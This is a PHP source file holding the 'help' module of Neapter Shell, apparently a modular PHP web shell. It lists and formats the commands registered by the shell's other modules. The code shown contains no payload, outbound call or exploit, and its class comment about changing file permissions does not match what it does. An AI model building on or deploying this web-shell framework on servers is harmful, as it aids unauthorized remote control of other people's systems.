<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleHelp extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('help');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
help - Wyświetlanie pomocy

    Użycie:
        help
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $aModulesCommands = array();

        foreach ($this->oUtils->getCommands() as $sCmd => $sClass) {
            if (!isset($aModulesCommands[$sClass])) {
                $aModulesCommands[$sClass] = '';
            }

            $aModulesCommands[$sClass] .= $sCmd . ', ';
        }


        $aModulesCommands = array_map(
            create_function('$a', 'return substr($a, 0, -2);'),
            $aModulesCommands
        );

        $iMaxLen = 0;

        /**
         * Szukanie najdluzszego ciagu (najdluzsza komenda)
         */
        foreach ($aModulesCommands as $sModuleCmd) {
            if (($iLen = strlen($sModuleCmd)) > $iMaxLen) {
                $iMaxLen = $iLen;
            }
        }

        $sOutput = NULL;


        /**
         * Formatowanie naglowkow z zewnetrznych modulow
         */
        foreach ($aModulesCommands as $sModule => $sModuleCmd) {
            $sHelp = $sModule::getHelp();

            $iPos = ((($iPos = strpos($sHelp, "\n")) !== FALSE) ? $iPos : strlen($sHelp));
            $sOutput .= str_pad($sModuleCmd, $iMaxLen, ' ') . ' - ' . trim(substr($sHelp, 0, $iPos)) . "\r\n";
        }

        $sOutput .= "\r\n\r\n";

        /**
         * Szczegolowa pomoc
         */
        if ($this->oArgs->getParam(0) === 'all') {
            foreach ($aModulesCommands as $sModule => $sModuleCmd) {
                $sHelp = $sModule::getHelp();

                $sOutput .= $sModuleCmd . ' - ' . $sHelp . "\r\n\r\n\r\n";
            }
        }

        return htmlspecialchars(substr($sOutput, 0, -6));
    }

}
